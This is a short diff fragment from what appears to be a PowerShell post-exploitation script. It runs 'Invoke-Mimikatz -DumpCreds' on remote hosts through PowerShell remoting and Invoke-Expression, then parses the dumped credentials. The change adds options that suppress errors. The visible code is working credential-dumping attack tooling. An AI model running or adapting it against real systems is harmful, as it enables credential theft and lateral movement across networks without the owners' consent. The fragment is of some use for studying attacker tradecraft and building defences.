@@ -3299,7 +3299,7 @@ Main
 }
 Invoke-Mimikatz -DumpCreds
 '@
-                $MimikatzOutput = Invoke-Command -Session (Get-PSSession) -ScriptBlock {Invoke-Expression -Command  "$args"} -ArgumentList $HostedScript                
+                $MimikatzOutput = Invoke-Command -Session (Get-PSSession) -ScriptBlock {Invoke-Expression -Command  "$args" -ErrorAction SilentlyContinue} -ArgumentList $HostedScript -ErrorAction SilentlyContinue
                 $TblResults = Parse-Mimikatz -raw $MimikatzOutput
                 $TblResults | foreach {
             
